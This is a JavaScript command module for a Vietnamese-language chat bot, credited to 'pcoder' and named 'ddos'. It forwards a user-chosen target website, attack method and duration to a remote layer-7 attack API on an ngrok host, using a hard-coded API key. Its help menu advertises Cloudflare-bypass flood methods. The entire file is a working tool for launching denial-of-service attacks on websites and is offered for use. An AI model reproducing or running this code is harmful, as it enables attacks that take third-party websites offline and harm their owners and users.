const axios = require('axios');
const fs = require('fs');

module.exports.config = {
    name: "ddos",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "pcoder",
    description: "Send requests to an API",
    commandCategory: "Tiện ích",
    usages: "~dus cc <method> <web> <time>",
    cooldowns: 5,
    dependencies: {}
}

module.exports.run = async function({ api, args, event }) {
    const { threadID, messageID } = event;
    const apiUrl = "https://better-foxhound-relative.ngrok-free.app/layer7?apikey=P_9455561926";
    const imagePath = __dirname + '/cache/dos.gif'; 

    // Kiểm tra tham số đầu vào
    if (args[0] === "cc" && args[1] && args[2] && args[3]) {
        const method = args[1];
        const web = args[2];
        const time = args[3];

        try {
            const response = await axios.get(`${apiUrl}&method=${method}&web=${web}&time=${time}`);
            
            // Kiểm tra mã trạng thái HTTP
            if (response.status === 200) {
                const data = response.data;
                let message = '';
                
                // Kiểm tra kết quả thành công từ API
                if (data.success === 200) {
                    message = `
━━━━━━━━━━━━━━━━━━━━━━━━
🎉 **Gửi yêu cầu thành công!**
━━━━━━━━━━━━━━━━━━━━━━━━
🔹 **Kết quả**: ${data.message}
🔸 **Số yêu cầu còn lại**: ${data.remainingRequests}
━━━━━━━━━━━━━━━━━━━━━━━━
                    `;
                } else {
                    message = `
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **Gửi yêu cầu không thành công!**
━━━━━━━━━━━━━━━━━━━━━━━━
❌ **Lỗi**: ${data.message}
━━━━━━━━━━━━━━━━━━━━━━━━
                    `;
                }

                // Gửi tin nhắn kèm ảnh
                api.sendMessage({
                    body: message,
                    attachment: fs.createReadStream(imagePath)
                }, threadID, messageID);
            } else {
                console.error('Error with response status:', response.status);
                api.sendMessage({
                    body: "❌ **Lỗi khi gửi yêu cầu!**\nMã trạng thái không phải 200.",
                    attachment: fs.createReadStream(imagePath)
                }, threadID, messageID);
            }

        } catch (error) {
            console.error('Error caught:', error.message);
            api.sendMessage({
                body: `❌ **Gửi yêu cầu thất bại!**\nLỗi: ${error.message}`,
                attachment: fs.createReadStream(imagePath)
            }, threadID, messageID);
        }
    } else {
        // Nếu không đủ tham số, gửi hướng dẫn sử dụng
        api.sendMessage({
            body: `
🎮 **𝙈𝙀𝙉𝙐 𝙋𝙆𝙏𝙊𝙊𝙇** 🎮
━━━━━━━━━━━━━━━━━━━━
⚡ **𝗣𝗖𝗢𝗗𝗘𝗥 x 𝗣𝗞𝗧𝗢𝗢𝗟**
━━━━━━━━━━━━━━━━━━━━
🛠️ **Cách sử dụng**:
    ~dus cc <method> <web> <time>

🔍 **Ví dụ**: ~dus cc get http://example.com 60

⚡ **Các Method hỗ trợ**:
    ➤ **strombypass**: Bypass DDoS tấn công bằng Strom
    ➤ **supercf**: Sử dụng Super Cloudflare Protection
    ➤ **https**: DDoS qua giao thức HTTPS

━━━━━━━━━━━━━━━━━━━━
            `,
            attachment: fs.createReadStream(imagePath)
        }, threadID, messageID);
    }
}